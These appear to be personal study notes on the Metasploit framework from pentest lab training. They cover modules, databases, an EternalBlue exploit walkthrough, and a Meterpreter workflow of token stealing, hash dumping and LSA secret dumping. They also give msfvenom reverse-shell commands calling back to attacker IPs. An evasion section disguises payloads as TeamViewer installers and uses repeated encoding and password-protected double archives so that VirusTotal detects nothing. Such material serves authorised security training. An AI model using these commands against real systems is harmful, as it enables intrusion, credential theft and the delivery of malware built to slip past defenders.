## Metasploit
MetaSploit is a framework that is used to exploit vulnerabilities in systems
- Metasploit Pro vs Metasploit framework (free): https://www.rapid7.com/products/metasploit/download/editions/
- written for Pentesters
- written in ruby
- all in one tool
- can be used for scanning, cracking, exploiting, post exploitation
- 
### Usages
```sh
msfdb run #start the metasploit database, keeps track on what found
db_nmap <target-ip> -A #scan a target, Aggressive
hosts #show all hosts in the database, (in this case from nmap)
search <searchterm> #search for a module
info <moduleNo> #get information about a module
use <moduleNo> #use a module
show target #show the target
run #run the module
run -j #would be run the module in the background
exploit #run the module 
sysinfo #get system information
exit #exit the module
ps #show all processes
migrate <pid> #migrate to another process

```
## Older or newer Exploits
- there are more exploits in msf than in the specific msf version other exploits can be found here https://github.com/rapid7/metasploit-framework/tree/master/modules/exploits
- to use it we can download it there and put it in the msf directory
```shell
#we can found metasploitexploit directory with 
locate exploits
# on pwnbox in: 
/usr/share/metasploit-framework/modules/exploits
```
### In msfconsole, we can manually load the exploit using the command:
``` use exploit/linux/http/rconfig_vendors_auth_file_upload_rce ```

## Types of Modules
| Type       | Description                                                                 |
|------------|-----------------------------------------------------------------------------|
| Auxiliary  | Scanning, fuzzing, sniffing, and admin capabilities. Offer extra assistance and functionality. |
| Encoders   | Ensure that payloads are intact to their destination.                       |
| Exploits   | Defined as modules that exploit a vulnerability that will allow for the payload delivery. |
| NOPs       | (No Operation code) Keep the payload sizes consistent across exploit attempts. |
| Payloads   | Code runs remotely and calls back to the attacker machine to establish a connection (or shell). |
| Plugins    | Additional scripts can be integrated within an assessment with msfconsole and coexist. |
| Post       | Wide array of modules to gather information, pivot deeper, etc.             |

## mafconsole search
```shell
#can be used to show all options
msf6 > help search 

#example search with several options
msf6 > search type:exploit platform:windows cve:2021 rank:excellent microsoft
```
## MSF permanent settings
This is like global settings until msfconsole restart
```shell
setg RHOSTS 10.10.10.40
setg RPORT 80
```
## Metasploit Basic Example
#### Scann if vuln to eternalblue
```shell
msfconsole
search eternalblue
use (number) #auxiliary/scanner/smb/smb_ms17_010
set RHOST 10.129.201.97
run
#Result
[+]:445     - Host is likely VULNERABLE to MS17-010! - Windows Server 2016 Standard 14393 x64 (64-bit)
[*] 10.129.201.97:445     - Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed

#to exploit for example eternablue psexec exploit from metasploit
```
#### exploit eternal blue
```shell
msfconsole
search eternalblue
use (number) # exploit/windows/smb/ms17_010_psexec
show options
set RHOST
... # set all required options
exploit
```


## Targets
- show vulnerable targets of an exploit 
- can be used inside an exploit
```shell
show targets 
set target 0 # 0 is usually automatic so msf will perform detection
set target 6 # we can set a specific target
```

## Payload
```shell
show payloads
```
### Filter payloads
```shell
grep meterpreter show payloads
grep meterpreter grep reverse_tcp show payloads
```
### Stageless vs Staged 
- Staged Payload will create a stage on the target system that can connect back to the attacker to get the next stage of the payload.
- Stageless Payload will create a single payload that will execute on the target system without needing to connect back to the attacker for additional stages.

#### Singles
A Single payload contains the exploit and the entire shellcode for the selected task.
#### Stagers 
Stager payloads work with Stage payloads to perform a specific task.
Stagers are typically used to set up a network connection between the attacker and victim and are designed to be small and reliable
#### Stages
Stages are payload components that are downloaded by stager's modules.

### Meterpreter Payload
Meterpreter has a ton of functionsuse
```shell 
help # in an meterpreter session to see them
```
 From extracting user hashes from SAM to taking screenshots and activating webcams.

### Payload types
| Payload                           | Description                                                                            |
|-----------------------------------|----------------------------------------------------------------------------------------|
| generic/custom                    | Generic listener, multi-use                                                            |
| generic/shell_bind_tcp            | Generic listener, multi-use, normal shell, TCP connection binding                      |
| generic/shell_reverse_tcp         | Generic listener, multi-use, normal shell, reverse TCP connection                      |
| windows/x64/exec                  | Executes an arbitrary command (Windows x64)                                            |
| windows/x64/loadlibrary           | Loads an arbitrary x64 library path                                                    |
| windows/x64/messagebox            | Spawns a dialog via MessageBox using a customizable title, text & icon                 |
| windows/x64/shell_reverse_tcp     | Normal shell, single payload, reverse TCP connection                                   |
| windows/x64/shell/reverse_tcp     | Normal shell, stager + stage, reverse TCP connection                                   |
| windows/x64/shell/bind_ipv6_tcp   | Normal shell, stager + stage, IPv6 Bind TCP stager                                     |
| windows/x64/meterpreter/$         | Meterpreter payload + varieties above                                                  |
| windows/x64/powershell/$          | Interactive PowerShell sessions + varieties above                                      |
| windows/x64/vncinject/$           | VNC Server (Reflective Injection) + varieties above                                    |


#### Encoding on custom payload
- https://hatching.io/blog/metasploit-payloads2/
If we wanted to create our custom payload, we could do so through msfpayload, but we would have to encode it according to the target OS architecture using msfencode afterward. A pipe would take the output from one command and feed it into the next, which would generate an encoded payload, ready to be sent and run on the target machine.
```shell
msfpayload windows/shell_reverse_tcp LHOST=127.0.0.1 LPORT=4444 R | msfencode -b '\x00' -f perl -e x86/shikata_ga_nai
```
Since 2015 msfvenom takes care for encoding.


### Custom Payload

#### msfvenom generate payload without encoding
```shell
msfvenom -a x86 --platform windows -p windows/shell/reverse_tcp LHOST=127.0.0.1 LPORT=4444 -b "\x00" -f perl
```
#### msfvenom generate payload with encoding
```shell
msfvenom -a x86 --platform windows -p windows/shell/reverse_tcp LHOST=127.0.0.1 LPORT=4444 -b "\x00" -f perl -e x86/shikata_ga_nai
```

## Encoding

### on existing payload 
```shell
show encoders
```

### encoding helps to avoid detection
```shell
msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp LHOST=10.10.14.5 LPORT=8080 -e x86/shikata_ga_nai -f exe -o ./TeamViewerInstall.exe
#this is on virus total 54/69 score a virus

msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp LHOST=10.10.14.5 LPORT=8080 -e x86/shikata_ga_nai -f exe -i 10 -o /root/Desktop/TeamViewerInstall.exe
#this has more iteration and is only 52/69
```
### msf virus total
Metasploit offers a tool called msf-virustotal that we can use with an API key to analyze our payloads. However, this requires free registration on VirusTotal.
```shell
msf-virustotal -k <API key> -f TeamViewerInstall.exe
```

## Databases
Databases in msfconsole keep track of our results.

### Setting up the Database
```shell
# get status
sudo service postgresql status

#start postgre
sudo systemctl start postgresql

#MSF - Initiate a Database
sudo msfdb init

#MSF - status of the database
sudo msfdb status

#msf - start the database
sudo msfdb run

#msf  Reinitiate the Database
msfdb reinit

#msf database options 
help database
```

## Workspaces
Workspaces are as folders in a project

```shell
workspace #list workspaces
workspace -a Target_1 #add workspace
workspace Target_1 #switch to workspace
workspace -h #help
```

## Importing Scan Results
We can import Nmap scan results into the database
```shell
cat Target.nmap
db_import Target.xml
```
### Using Nmap Inside MSFconsole with db
```shell
db_nmap -sV -sS 10.10.10.8
```

## Data Backup
```shell
db_export -h #help
db_export -f xml backup.xml #export to xml
```

## Hosts
The hosts command displays a database table automatically populated with the host addresses, hostnames, and other information we find about these during our scans 
```shell
hosts -h #help
hosts #list all hosts
```

## Services
 It contains a table with descriptions and information on services 
```shell
services -h #help
services #list all hosts
```

## Credentials
The credentials command displays a table with all the credentials we have gathered during our scans 
We can also add credentials manually
```shell
creds -h #help
```

## Loot
The loot, in this case, refers to hash dumps from different system types, namely hashes, passwd, shadow, and more.
```shell
loot -h #help
```

## Plugins
Plugins are prepared functions and extensions from other devs, with approval from Metasploit, that can be used in msf
```shell
#list all installed plugins
ls /usr/share/metasploit-framework/plugins

#load plugin nessus 
load nessus

#install new plugin
git clone https://github.com/darkoperator/Metasploit-Plugins
ls Metasploit-Plugins
cp Metasploit-Plugins/* /usr/share/metasploit-framework/plugins

msfconsole -q #start msfconsole
load pentest #load the plugin
```
| Tool                      | Description                                                                                                                                                 | Uses                                                                                          |
|---------------------------|-------------------------------------------------------------------------------------------------------------------------------------------------------------|-----------------------------------------------------------------------------------------------|
| **nMap (pre-installed)**  | A network scanning tool used to discover hosts and services on a computer network by sending packets and analyzing the responses.                             | Network inventory, managing service upgrade schedules, monitoring host or service uptime.     |
| **NexPose (pre-installed)** | A vulnerability scanner that identifies vulnerabilities in systems and networks, prioritizes those vulnerabilities, and provides remediation steps.           | Security assessment, vulnerability management, risk assessment.                               |
| **Nessus (pre-installed)** | Another popular vulnerability scanner that identifies potential vulnerabilities in systems and networks, including missing patches, default passwords, and misconfigurations. | Security assessments, compliance checks, vulnerability management.                            |
| **Mimikatz (pre-installed V.1)** | A post-exploitation tool used to extract plaintext passwords, hash, PIN code, and Kerberos tickets from memory.                                              | Credential dumping, pass-the-hash attacks, Kerberos ticket manipulation.                      |
| **Stdapi (pre-installed)** | A standard API used in Metasploit to interact with the victim's system post-exploitation, providing functions for file system interaction, process management, and network operations. | Post-exploitation tasks such as file upload/download, process execution, and system information gathering. |
| **Railgun**               | An extension for Metasploit that allows interaction with the Windows API, enabling deeper system interaction and manipulation.                                | Advanced post-exploitation activities such as interacting with low-level Windows functionalities. |
| **Priv**                  | A module in Metasploit for managing and escalating privileges on a compromised system.                                                                       | Privilege escalation, session manipulation, token stealing.                                   |
| **Incognito (pre-installed)** | A Metasploit module for token manipulation and impersonation to escalate privileges on a compromised system.                                                 | Token stealing, impersonation, privilege escalation.                                          |
| **Darkoperator's**        | Likely referring to scripts and extensions developed by Carlos Perez (aka Darkoperator) for Metasploit, which enhance the framework's capabilities.           | Various enhancements for post-exploitation, automation, and system interaction.               |

## Mixins
The Metasploit Framework, written in Ruby, leverages mixins to provide flexibility and modularity, enhancing both script creation and usage. Mixins allow classes to use methods from other classes without inheritance, making Ruby's modular design a key feature for Metasploit's powerful and customizable functionality.

## Sessions
MSFconsole can manage multiple modules simultaneously using Sessions, which provide dedicated control interfaces for each deployed module. This allows users to switch between sessions, link different modules to backgrounded sessions, and run or turn them into jobs, ensuring persistent connections to target hosts unless interrupted by runtime issues.
- This is specifically useful when we want to run an additional module on an already exploited system with a formed, stable communication channel.
```shell
sessions # list all sessions
sessions -h #help
sessions -i 1 #interact with session 1
sessions -l # list all sessions
```
### Switch session and chain exploits
```shell
search elfinder #search first exploit
use 0
set ... # set options for exploit 1
exploit
meterpreter > background
search sudo # search second exploit
use 1
set SESSION 1 # if before is in session 1
set ... # other options
exploit # will exploit based on further stage

```

## Jobs
To free up a port used by an active exploit, use the jobs command to terminate the task instead of using [CTRL] + [C], ensuring the port is available for new modules.
```shell
jobs -h
exploit -j #run the exploit in the background as job
jobs -l #list all jobs
```


## Meterpreter :
- further read https://www.rapid7.com/blog/post/2015/03/25/stageless-meterpreter-payloads/

### Workflow

```shell

db_nmap -O -A 10.129.118.172
db_nmap -sV -p- -T5 -A 10.129.118.172
db_nmap -sV -sC -T5 -A 10.129.118.172

hosts # has already ip from nmap
services # has already services from nmap
search iis_webdav_upload_asp #search for exploit
use 0 #use the exploit 
set RHOST 10.10.10.15
set LHOST tun0
run
getuid #get the user id
ps #list all processes
steal_token 1836 #steal the token from the process
migrate 2136 #migrate to other process
getuid #get the user id now from the process
bg #background the session
search local_exploit_suggester #search for exploits based on session
use 0 #use the exploit
set SESSION 1
run
use 1
show options
set SESSION 1
set LHOST tun0
run
hashdump #dump the hashes
lsa_dump_sam #dump the sam
lsa_dump_secrets #dump the secrets
```
## MSFVENOM
with multihandler we can handle a reverse shell from msfvenom also meterpreter
```shell
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.5 LPORT=1337 -f aspx > reverse_shell.exe
msfconsole -q 
msf6 > use multi/handler
msf6 exploit(multi/handler) > show options
set LHOST 10.10.14.5
set LPORT 1337
run
http://10.10.10.5/reverse_shell.aspx
Started reverse TCP handler on 10.10.14.5:1337 
meterpreter > getuid

```
## local_exploit_suggester
use this when session open to find exploits

## Firewall and IDS/IPS Evasion
| Security Policy                             | Description                                                                                     |
|---------------------------------------------|-------------------------------------------------------------------------------------------------|
| Signature-based Detection                   | Compares network packets with known attack patterns, generating alarms on a 100% match.         |
| Heuristic / Statistical Anomaly Detection   | Compares behavior against a baseline to detect deviations indicating potential threats.         |
| Stateful Protocol Analysis Detection        | Detects protocol divergences by comparing events to non-malicious activity profiles.            |
| Live-monitoring and Alerting (SOC-based)    | Analysts in a SOC monitor network activity and handle potential threats with live-feed software. |

### embedding payloads in any file 
```shell
# as TeamViewer.exe
msfvenom windows/x86/meterpreter_reverse_tcp LHOST=10.10.14.2 LPORT=8080 -k -x ~/Downloads/TeamViewer_Setup.exe -e x86/shikata_ga_nai -a x86 --platform windows -o ~/Desktop/TeamViewer_Setup.exe -i 5

# in an ARchive
msfvenom windows/x86/meterpreter_reverse_tcp LHOST=10.10.14.2 LPORT=8080 -k -e x86/shikata_ga_nai -a x86 --platform windows -o ~/test.js -i 5
cat test.js
# �+n"����t$�G4ɱ1zz��j�V6����ic��o�Bs>��Z*�����9vt��%��1�
# <...SNIP...>
# �Qa*���޴��RW�%Š.\�=;.l�T���XF���T��
```
If we check against VirusTotal to get a detection baseline from the payload we generated, the results will be the following:
```shell
msf-virustotal -k <API key> -f test.js 
# Exploit.Metacoder.Shikata.Gen
#...
```
Archive it twice, password-protect both, remove the extensions, and install RAR utility from RARLabs for this purpose.

```shell
wget https://www.rarlab.com/rar/rarlinux-x64-612.tar.gz
tar -xzvf rarlinux-x64-612.tar.gz && cd rar
rar a ~/test.rar -p ~/test.js
mv test.rar test # remove the extension
rar a test2.rar -p test # Archiving the Payload Again
mv test2.rar test2 # remove the extension
msf-virustotal -k <API key> -f test2 # virustotal will find no virus
# virustotal will find no virus
```
### Packers
A packer can be used to pack the payload and unpack it on the target system

| UPX packer            | The Enigma Protector | MPRESS           |
|-----------------------|----------------------|------------------|
| Alternate EXE Packer  | ExeStealth           | Morphine         |
| MEW                   | Themida              |                  |


# Self coded Modules and Exploits
- here is a another guide https://nostarch.com/metasploit

Its possible to port exploits to metasploit ruby scripts by urself. Please check Academy or Google
maybe i add this somewhen here

### Evasion 
When coding or porting an exploit, ensure it's not easily identifiable by target system security measures. For instance, randomizing patterns in a Buffer Overflow exploit can help evade IDS/IPS detection by breaking their database signatures.


